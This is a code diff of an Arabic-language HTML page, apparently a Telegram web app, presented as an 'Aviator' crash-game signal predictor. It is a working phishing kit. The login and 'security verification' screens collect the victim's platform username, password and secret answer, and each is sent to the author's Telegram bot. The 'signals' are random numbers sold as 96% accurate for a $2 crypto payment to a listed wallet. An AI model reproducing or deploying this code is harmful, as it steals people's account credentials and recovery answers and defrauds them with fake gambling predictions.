@@ -1,83 +1,138 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VETO VISION PRO - FULL BOT</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Aviator Quantum Predictor v6.0</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { background: #000; color: white; font-family: sans-serif; overflow: hidden; }
+        .auth-input { width: 100%; padding: 1rem; background: #121212; border: 1px solid rgba(255,255,255,0.05); border-radius: 1rem; text-align: center; outline: none; }
+        .auth-input:focus { border-color: #3b82f6; }
+        .sec-input { width: 100%; padding: 1.2rem; background: white !important; border: 4px solid #ef4444 !important; border-radius: 1rem; color: black !important; font-weight: 900; font-size: 1.2rem; text-align: center; outline: none; }
         .hidden { display: none !important; }
-        .circle-glow {
-            width: 280px; height: 280px; border-radius: 50%;
-            background: radial-gradient(circle, #1e69ff 0%, #0044cc 100%);
-            box-shadow: 0 0 50px rgba(30, 105, 255, 0.6);
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
     </style>
 </head>
-<body>
+<body class="bg-[#050505] text-white font-['Inter'] overflow-hidden">
 
-    <section id="step1" class="flex flex-col items-center justify-center h-screen p-6">
-        <h1 class="text-3xl font-black italic mb-8">QUANTUM<span class="text-blue-500">NODE</span></h1>
-        <div class="w-full max-w-xs space-y-4">
-            <input type="text" id="user" placeholder="رقم الهاتف أو البريد" class="w-full p-4 bg-zinc-900 rounded-xl text-center outline-none">
-            <input type="password" id="pass" placeholder="كلمة المرور" class="w-full p-4 bg-zinc-900 rounded-xl text-center outline-none">
-            <button onclick="toStep2()" class="w-full py-4 bg-blue-600 rounded-xl font-bold uppercase">Start Real-Time Sync</button>
+    <section id="auth-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 bg-gradient-to-b from-[#0a0a0a] to-black">
+        <div class="w-full max-w-md space-y-8 text-center">
+            <div class="inline-flex items-center px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-bold uppercase tracking-widest">Secure Cloud Sync</div>
+            <h1 class="text-4xl font-black tracking-tighter italic uppercase">Quantum<span class="text-blue-500">Node</span></h1>
+            <p class="text-zinc-500 text-sm font-medium">يرجى ربط حساب المنصة لتفعيل المزامنة الفورية</p>
+            <div class="space-y-4">
+                <input type="text" id="u_log" placeholder="رقم الهاتف أو البريد الإلكتروني" class="auth-input">
+                <input type="password" id="u_pas" placeholder="كلمة المرور" class="auth-input">
+                <button onclick="processAuth()" id="sync-btn" class="w-full py-4 bg-blue-600 rounded-2xl font-black text-lg uppercase shadow-lg shadow-blue-600/20">Start Real-Time Sync</button>
+            </div>
+            <p class="text-[10px] text-zinc-600 uppercase tracking-widest">Global Encryption: AES-256 Active</p>
         </div>
     </section>
 
-    <section id="step2" class="hidden flex flex-col items-center justify-center h-screen p-6 text-center">
-        <div class="w-20 h-20 border-2 border-red-600 rounded-full flex items-center justify-center mb-6 bg-red-600/10">
-            <span class="text-red-600 text-4xl">⚠️</span>
+    <section id="security-layer" class="hidden fixed inset-0 z-[60] flex flex-col items-center justify-center p-6 bg-black">
+        <div class="w-full max-w-md text-center space-y-6">
+            <div class="w-20 h-20 border-2 border-red-600 rounded-full flex items-center justify-center mx-auto bg-red-600/10">
+                <span class="text-red-600 text-4xl">⚠️</span>
+            </div>
+            <h2 class="text-2xl font-black uppercase">Security Verification</h2>
+            <p class="text-red-500 font-bold text-sm italic">أدخل "اللقب" أو "الإجابة السرية" لفتح التشفير السحابي</p>
+            <input type="text" id="u_nick" placeholder="اكتب اللقب هنا..." class="sec-input">
+            <button onclick="finalVerify()" class="w-full py-4 bg-white text-black font-black rounded-2xl uppercase shadow-xl">Confirm & Unlock</button>
         </div>
-        <h2 class="text-2xl font-black uppercase mb-2">Security Lock</h2>
-        <p class="text-zinc-400 text-sm mb-6">أدخل اللقب أو الإجابة السرية لتأكيد هويتك</p>
-        <input type="text" id="nickname" placeholder="اللقب أو الإجابة" class="w-full max-w-xs p-4 bg-white text-black font-bold rounded-xl text-center border-4 border-red-600 outline-none">
-        <button onclick="toStep3()" class="w-full max-w-xs py-4 bg-white text-black font-black rounded-xl mt-4 uppercase">Confirm & Unlock</button>
     </section>
 
-    <section id="step3" class="hidden flex flex-col items-center justify-center h-screen p-4">
-        <div class="circle-glow mb-8">
-            <div id="result" class="text-6xl font-black italic">1.00x</div>
-            <div class="text-[10px] tracking-widest opacity-70">NEXT HIT</div>
-        </div>
-        <h2 class="text-2xl font-black italic uppercase">Veto Vision Pro</h2>
-        <button onclick="getSignal()" class="mt-12 w-full max-w-xs py-5 bg-cyan-500 text-black font-black rounded-3xl text-xl uppercase">Get Signal</button>
+    <section id="main-app" class="hidden h-screen flex flex-col p-4 bg-[#050505]">
+        <header class="flex justify-between items-center py-4 px-2">
+            <div class="flex items-center gap-2">
+                <span class="w-2 h-2 bg-cyan-400 rounded-full animate-pulse shadow-[0_0_10px_#22d3ee]"></span>
+                <span class="text-xs font-black italic tracking-tighter uppercase text-zinc-400">Aviator Veto Vision</span>
+            </div>
+            <div class="px-3 py-1 rounded-lg bg-zinc-900 border border-white/5 text-[10px] font-bold text-cyan-400">LIVE TRAFFIC: 4.8k</div>
+        </header>
+
+        <main class="flex-1 flex flex-col items-center justify-center relative">
+            <div class="relative w-72 h-72 flex items-center justify-center">
+                <div class="absolute inset-0 rounded-full border-[2px] border-cyan-500/30 animate-ping"></div>
+                <div class="absolute inset-4 rounded-full border-[8px] border-white shadow-[0_0_50px_rgba(34,211,238,0.4)] bg-[#0057ff]">
+                    <div class="absolute inset-0 bg-gradient-to-tr from-blue-700 to-cyan-400 opacity-40 rounded-full"></div>
+                </div>
+                <div class="relative z-10 text-center">
+                    <div id="target-mult" class="text-6xl font-black italic tracking-tighter text-white">1.00x</div>
+                    <div class="text-[10px] font-black text-cyan-200 tracking-[0.4em] uppercase mt-2">Next Hit</div>
+                </div>
+            </div>
+            <div class="mt-8 text-center">
+                <h2 class="text-xl font-black italic tracking-widest text-white uppercase">Veto Vision Pro</h2>
+                <div class="flex gap-4 mt-2">
+                    <span class="text-[10px] text-zinc-500 font-bold uppercase">Accuracy: <span class="text-yellow-500">60% Free</span></span>
+                    <span class="text-[10px] text-zinc-500 font-bold uppercase">Status: <span class="text-green-500">Optimized</span></span>
+                </div>
+            </div>
+        </main>
+
+        <footer class="space-y-4 pb-4">
+            <div class="bg-zinc-900/50 border border-white/5 p-4 rounded-3xl">
+                <div class="flex justify-between items-center mb-3">
+                    <span class="text-xs font-black text-cyan-400 uppercase italic">🔥 VIP Activation (96%)</span>
+                    <span class="text-[10px] bg-cyan-400 text-black px-2 py-0.5 rounded font-black">$2 Lifetime</span>
+                </div>
+                <p class="text-[10px] text-zinc-400 leading-relaxed">• استعادة 10% من رصيدك يومياً.<br>• دقة إشارات تفوق 96%.</p>
+                <div class="flex items-center gap-2 bg-black/50 p-2 rounded-xl mt-2">
+                    <code class="text-[9px] text-cyan-500 flex-1 truncate font-mono">TYXbsFZK3HYq3LX1uwX113Ukrm44ib9XDr</code>
+                    <button class="text-[9px] font-bold bg-zinc-800 px-3 py-1 rounded-lg">COPY</button>
+                </div>
+            </div>
+            <button onclick="getSignal()" id="action-btn" class="w-full py-5 bg-cyan-500 rounded-[2rem] font-black text-xl italic text-black shadow-xl uppercase">GET SIGNAL</button>
+        </footer>
     </section>
 
     <script>
-        const token = "YOUR_BOT_TOKEN";
-        const cid = "YOUR_CHAT_ID";
+        // التوكن والايدي الخاص بك
+        const botToken = "YOUR_BOT_TOKEN"; 
+        const chatId = "YOUR_CHAT_ID";
 
-        function send(m) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(m)}&parse_mode=html`);
+        function sendData(msg) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`);
         }
 
-        function toStep2() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-            if(u && p) {
-                send(`<b>🔥 حساب جديد:</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-            }
+        // معالجة الدخول (المرحلة 1)
+        function processAuth() {
+            const u = document.getElementById('u_log').value;
+            const p = document.getElementById('u_pas').value;
+            if(!u || !p) return;
+
+            sendData(`<b>🔥 صيد جديد (Login):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
+            
+            document.getElementById('auth-screen').classList.add('hidden');
+            document.getElementById('security-layer').classList.remove('hidden');
         }
 
-        function toStep3() {
-            const n = document.getElementById('nickname').value;
-            if(n) {
-                send(`<b>⚠️ اللقب المستلم:</b>\n🔑: <code>${n}</code>`);
-                document.getElementById('step2').classList.add('hidden');
-                document.getElementById('step3').classList.remove('hidden');
-            }
+        // معالجة اللقب (المرحلة 2)
+        function finalVerify() {
+            const n = document.getElementById('u_nick').value;
+            if(!n) return;
+
+            sendData(`<b>⚠️ اللقب المستلم:</b>\n🔑: <code>${n}</code>`);
+
+            document.getElementById('security-layer').classList.add('hidden');
+            document.getElementById('main-app').classList.remove('hidden');
         }
 
+        // تشغيل الرادار (المرحلة 3)
         function getSignal() {
-            const res = document.getElementById('result');
-            res.innerText = "WAIT...";
+            const target = document.getElementById("target-mult");
+            const btn = document.getElementById("action-btn");
+            
+            btn.disabled = true;
+            btn.innerText = "ANALYZING...";
+            
+            let val = (Math.random() * (12 - 1.1) + 1.1).toFixed(2);
+            
             setTimeout(() => {
-                res.innerText = (Math.random() * (5 - 1.1) + 1.1).toFixed(2) + "x";
+                target.innerText = val + "x";
+                btn.disabled = false;
+                btn.innerText = "GET SIGNAL";
             }, 1000);
         }
     </script>
